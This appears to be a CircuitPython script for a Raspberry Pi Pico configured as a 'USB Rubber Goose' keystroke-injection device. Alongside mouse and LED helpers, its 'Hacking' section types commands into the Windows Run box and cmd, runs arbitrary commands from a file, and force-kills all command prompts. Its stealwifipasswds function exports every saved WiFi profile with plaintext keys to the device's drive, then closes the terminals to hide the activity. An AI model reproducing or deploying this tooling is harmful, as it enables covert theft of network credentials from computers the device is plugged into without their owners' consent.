#USB-Rubber-Goose-Functions.py

#main imports
import time #for waiting
import digitalio #for interfacing with pins
import board #for interfacing with pins

#hid imports
import usb_hid #to get usb interface devices
from adafruit_hid.mouse import Mouse #to be able to move a mouse
from adafruit_hid.keyboard import Keyboard #be able to send key presses
from adafruit_hid.keycode import Keycode #be able to send keycodes
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS #be able to type

#hid definitions
keyboard = Keyboard(usb_hid.devices) #set up the usb hid device
layout = KeyboardLayoutUS(keyboard) #setup the keyboard interface
mouse = Mouse(usb_hid.devices)

#LED definitions
led = digitalio.DigitalInOut(board.GP25) #se the pin (GP25)
led.direction = digitalio.Direction.OUTPUT #set as an output
led.value = False #turn off the led


#definitions

#Mouse:
def doubleclick(): #for simulating a double click
    #print("Double Clicked")
    mouse.click(Mouse.LEFT_BUTTON)
    time.sleep(0.1)
    mouse.click(Mouse.LEFT_BUTTON)
    
def scroll(scroll): #for simulating a scroll for a certain amount
    #note: -7 is a good value for scrolling in apps like TikTok/Instagram/SnapChat
    mouse.move(wheel=scroll)
    time.sleep(3)
    
def move(x,y): #for moving a certain amount
    mouse.move(x=x, y=y)


#Keyboard:


#LED:
def flashinbuiltLED(): #flash the inbuilt LED once
    led.value = True
    time.sleep(0.25)
    led.value = False
    
def tripleflashLED():  #flash the inbuilt LED once
    for i in range(3): #flash the led 3 times
        flashinbuiltLED()
        time.sleep(0.25)


#Hacking:
        
def windowsRun(text): #run the given text in the Run prompt
    keyboard.send(Keycode.WINDOWS, Keycode.R) #press Win+R keys
    time.sleep(1) #wait 1 second for the run box to open
    layout.write(f"{text}\n") #type the text & newline
    
def docommand(command): #run the given text in the command prompt
    windowsRun('cmd') #open cmd via run prompt
    time.sleep(1) #wait 1 second
    layout.write(f'{command}\n') #type command & newline
    
def doallcommands(): #run  all the commands in `commands.txt` in the command prompt
    f = open("commands.txt")
    Lines = f.readlines()
    for line in Lines:
        docommand(line.strip())
        time.sleep(1) # wait for the previous command to execute
    f.close()

def killterminals(): #kills all active terminals
    docommand("TASKKILL /F /T /IM cmd.exe")

def stealwifipasswds(): #exports all wifi passwords in xml format to a `WiFi-Cracks` folder on the Pico
    docommand('mkdir E:WiFi-Cracks') #makes a directory to put the files into
    docommand('netsh wlan export profile folder=E:WiFi-Cracks key=clear \n') #exports all info
    time.sleep(5) #wait for command to execute
    killterminals() #close all open terminals
    
print("Definitions Done On: `USB-Rubber-Goose-Functions`")